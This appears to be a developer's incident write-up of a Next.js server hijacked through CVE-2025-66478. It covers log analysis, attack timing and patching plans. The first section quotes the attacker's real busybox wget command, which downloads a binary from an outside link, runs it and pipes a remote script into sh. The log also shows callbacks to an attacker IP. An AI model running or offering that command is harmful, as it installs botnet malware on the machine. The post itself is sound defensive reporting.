---
original: 殭屍網路真實遭遇分享
title: 'A Real Botnet Encounter: The React Vulnerability Rated CVSS 10'
description: >-
  My server was quietly running someone else's malware for eleven hours. How I
  found it in journalctl, traced it to CVE-2025-66478 in Next.js, and what we're
  changing so it doesn't happen again.
tags: []
sourceHash: '700ea084b79a'
---

I never thought I'd run into a cyberattack one day. I'm writing it down for reference, and I made a few slides so you can get the gist quickly.
If you haven't updated Next.js yet, do it now. And if you're a security expert, I'd love your advice 🙏

1️⃣ It started when someone told me the site was unreachable
Yesterday the site kept returning 504s. I assumed it was an old problem, but when I opened journalctl, something was clearly very wrong. I saw a string of really strange commands:

'(cd /dev;busybox wget https://lnkd.in/gDNJFzwQ 777 x86;./x86 reactOnMynuts;busybox wget -q https://lnkd.in/gi43PY4V -O-|sh)'



My heart sank. Uh-oh, I might have been compromised.

2️⃣ Restarting didn't help. The malicious behavior came back on its own
I restarted the service, and within minutes the site hung again, with this in the log:

- Dec 06 06:27:10 bun[749218]: ⨯ SyntaxError: Cannot use the keyword 'function' as a parameter name.
- Dec 06 06:27:10 bun[749218]:  at Function (null)
- Dec 06 06:27:10 bun[749218]:  at processTicksAndRejections (null) { digest: '1206194814' }
- Dec 06 06:31:03 bun[749218]: Connecting to 193.34.213.150 (193.34.213.150:80)

That meant this was coming from inside my web service process, a lot like some payload being stuffed into new Function(...) / eval or the like.

Scarier still, it tried to connect back to 193.34.213.150 every few seconds. Restarting was just rebooting the malware for it 🫠

3️⃣ Packing up the evidence from the whole machine
Realizing this EC2 instance was no longer clean... I planned to reincarnate onto a fresh EC2 instance, but before leaving I decided to take the evidence with me.

I packed up all the logs and started analyzing journal-all.log with grep to see when the attack began:
- Dec 06 03:47:51: first malicious wget connection seen
- Dec 06 14:45:58: I DROPped the attacker's IP

I also counted occurrences:
grep -R "wget" journal-all.log | wc -l  # 2714
grep -R "193.34.213" journal-all.log | wc -l # 2720
grep -R "nuts" journal-all.log | wc -l  # 2712
grep -R "bolts" journal-all.log | wc -l # 2712

In other words, the attack lasted at least about 11 hours, from 03:47 to 14:45 Taiwan time on December 6, running the downloader about 2,712 times, roughly once every 15 seconds on average according to the logs.

So this wasn't a one-off moment. It was a zombie 🧟 living in my Bun process for a long stretch.


4️⃣ Finding the cause: the entry point was web server RCE
All my EC2 instances only allow AWS SSM, port 22 has been closed for a long time, and no database is exposed. But the logs kept showing execution inside the bun process, so I guessed the web entry point had been hit.

I first checked my code for RCE vulnerabilities but didn't see an obvious cause. Searching online, I found a security incident disclosed three days earlier:

 CVE-2025-66478 — Next.js React Flight Protocol RCE (Critical 10/10)

This vulnerability can let attackers get into the server side through an HTTP request and execute commands directly. What I saw in the logs was very similar to the public exploit pattern, so I updated Next.js immediately.

5️⃣ Takeaways
This incident made me realize that once a product is live, security isn't optional; it's a basic operating cost. We spent a lot of time on performance, optimization and deployment pipelines, but what took the EC2 instance down wasn't badly written code. It was not keeping up with a framework-level vulnerability.

Going forward, we'll do the following:
- Regularly read React / Next security advisories
- Mandatory patching within 48 hours of a CVE being published

This was my first time, but I doubt it'll be the last 🫠

If you're running a React / Next / Bun / Node web server in production, I really recommend going back through journalctl from the past few days. You might also find "a line of commands you never wrote, working very diligently 🙂"

Also, does anyone have recommendations for automatically monitoring CVEs?

#cybersecurity #infosec #devsecops #cve #rce #reactjs
#nextjs #CVE202566478
